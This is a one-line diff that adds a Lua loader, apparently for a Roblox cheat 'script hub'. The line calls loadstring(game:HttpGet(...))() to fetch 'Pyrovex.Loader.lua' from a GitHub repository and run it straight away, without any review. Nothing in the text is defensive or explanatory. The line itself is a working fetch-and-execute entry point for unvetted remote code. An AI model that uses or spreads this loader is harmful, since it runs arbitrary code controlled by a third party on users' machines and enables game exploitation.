@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ramirezmattandrewaragon-cell/Kingflamehub/main/Pyrovex.Loader.lua"))()
